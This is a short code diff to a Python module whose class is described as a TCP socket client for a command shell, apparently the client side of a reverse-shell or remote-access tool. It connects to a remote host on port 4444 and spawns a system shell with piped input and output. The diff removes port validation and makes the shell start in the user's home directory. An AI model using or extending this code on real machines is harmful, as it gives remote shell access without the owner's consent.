@@ -2,6 +2,7 @@
 from .nodeutils import (
     os,
     shutil,
+    Path,
     subprocess,
     struct,
     sys,
@@ -13,11 +14,11 @@ from .nodeutils import (
 
 class Client(StreamSocket):
     """TCP socket client class for the command shell"""
-    def __init__(self, rhost: str, port=4444, buff=1024, verb=False):
-        if not (str(port).isdigit() & (1 <= int(port) <= 65535)):
-            utils.throw("Expected <port> to be an int less or equal to 65535")
-        else:
-            super().__init__(rhost, port, verb)
+    def __init__(self, rhost="0.0.0.0", port=4444, verb: bool = False):
+        if verb:
+            utils.status(f"port => {port}")
+
+        super().__init__(str(rhost), int(port), verb)
         self.Shell = None
 
     def spawn_shell(self, op_sys: str = os.name) -> subprocess.Popen:
@@ -38,7 +39,7 @@ class Client(StreamSocket):
             [], shell=True,
             executable=shell_exec,
             env=environment,
-            #cwd=str(Path.home()),
+            cwd=str(Path.home()),
             stdin=subprocess.PIPE,
             stdout=subprocess.PIPE,
             stderr=subprocess.PIPE,
